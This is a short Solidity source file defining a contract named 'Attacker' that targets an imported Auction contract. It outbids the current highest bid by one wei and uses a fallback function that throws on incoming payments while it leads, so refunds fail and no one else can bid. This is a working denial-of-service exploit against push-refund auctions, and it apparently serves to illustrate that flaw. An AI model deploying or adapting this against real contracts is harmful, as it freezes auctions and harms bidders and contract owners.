pragma solidity ^0.4.10;

import "./auction.sol";

contract Attacker {
    Auction auc;
    
    function attack(address addr) {
        auc = Auction(addr);
        
        uint val = auc.getHighestBid();
        auc.bid.value(val + 1)();
    }
    
    function() payable public {
        if (auc.getCurrentLeader() == address(this)) throw;
    }
    
}